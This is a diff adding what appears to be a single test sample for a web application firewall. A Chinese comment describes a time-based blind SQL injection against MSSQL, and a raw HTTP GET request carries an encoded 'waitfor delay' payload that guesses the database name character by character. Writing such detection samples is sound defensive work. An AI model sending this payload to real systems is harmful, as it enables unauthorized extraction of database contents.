@@ -1,0 +1,9 @@
+# SQL注入_GET_mssql_延时注入-06506457
+# 攻击者基于延时查询，将"if(ascii(substring(db_name(),1,1))=111) waitfor delay'0:0:5'"语句注入到 SQL 查询参数中，通过提取数据库名称的每个字符利用函数waitfor delay来延长数据库处理时间，通过加载时间来对注入结果进行判定以逐步爆破出完整数据库名称。
+GET /?id=1%20if%28ascii%28substring%28db_name%28%29%2C1%2C1%29%29=111%29%20waitfor%20delay%270:0:5%27&bid=hd_tag_m8mv26mb HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26mb
+RM-PRO-Token: f78e64f3ba9c5670b5c497f6a66c6654
+RM-PRO-Time: 1742808635954
+User-Agent: curl/7.83.1
+
